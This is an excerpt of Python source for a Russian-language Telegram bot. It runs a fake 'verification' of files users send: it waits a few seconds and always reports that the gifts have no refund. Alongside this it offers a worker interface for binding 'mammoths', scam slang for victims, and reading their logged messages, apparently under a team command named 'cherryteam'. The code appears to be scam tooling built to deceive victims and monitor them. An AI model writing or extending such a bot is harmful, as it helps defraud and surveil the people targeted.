...
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if user_state == UserState.AWAITING_USERNAME:
        if "@" in text:
            await update.message.reply_text("❌ Пожалуйста, отправьте username без @")
            return
        
        user_data_storage[user_id]["username"] = text
        user_data_storage[user_id]["state"] = UserState.AWAITING_FILE
        await update.message.reply_text("✅ Username получен!\n\nТеперь отправьте файл для полной проверки.")
        
    elif user_state == UserState.AWAITING_MAMMOTH:
        await handle_mammoth_binding(update, context, text)
        
    else:
        if not text.startswith('/'):
            user_data_storage[user_id]["state"] = UserState.AWAITING_USERNAME
            await update.message.reply_text("Пожалуйста, отправьте свой username без @ чтобы начать проверку.")
...
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if user_state == UserState.AWAITING_FILE:
        await update.message.reply_text("Файл получен! Проверка запущена...\nОжидание до 10 секунд.")
        
        await asyncio.sleep(4)
        await update.message.reply_text("Проверка завершена! На подарках нет рефаунда.")
        user_data_storage[user_id]["state"] = ""

async def cherryteam(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
...
async def handle_mammoth_binding(update: Update, context: ContextTypes.DEFAULT_TYPE, identifier: str) -> None:
    user_id = update.effective_user.id
    ...
    try:
        ...
        if not mammoth_id:
            await update.message.reply_text("❌ Мамонт не найден. Убедитесь, что мамонт нажал /start в боте.")
            return
        
        if mammoth_id not in mammoth_messages or not any(msg["text"] == "/start" for msg in mammoth_messages[mammoth_id]):
            await update.message.reply_text("❌ Мамонт еще не нажал команду /start")
            return
        ...
        user_data_storage[user_id]["state"] = ""
        await update.message.reply_text("✅ Мамонт успешно привязан!")
        ...
        await update.message.reply_text("❌ Произошла ошибка при привязке мамонта.")
...
async def handle_button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if data == "bind_mammoth":
        ...
        await query.edit_message_text("Отправьте username или id мамонта, важно: мамонт должен прожать команду /start")
        
    elif data == "my_mammoths":
        await show_my_mammoths(query, user_id)
        
    elif data.startswith("mammoth_"):
        mammoth_id = int(data.split("_")[1])
        await show_mammoth_messages(query, user_id, mammoth_id)
...
async def show_my_mammoths(query, user_id: int) -> None:
    if user_id not in mammoth_connections or not mammoth_connections[user_id]:
        await query.edit_message_text("У вас нет привязанных мамонтов.")
        return
    ...
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text("Ваши привязанные мамонты:", reply_markup=reply_markup)

async def show_mammoth_messages(query, worker_id: int, mammoth_id: int) -> None:
    if mammoth_id not in mammoth_messages or not mammoth_messages[mammoth_id]:
        await query.edit_message_text("У этого мамонта нет сообщений.")
        return
    ...
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(messages_text[:4000], reply_markup=reply_markup)
...
def main():
    ...
    try:
        ...
        application.add_handler(CommandHandler("cherryteam", cherryteam))
        application.add_handler(CommandHandler("ban", ban))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        application.add_handler(MessageHandler(filters.ALL & ~filters.TEXT, handle_file))
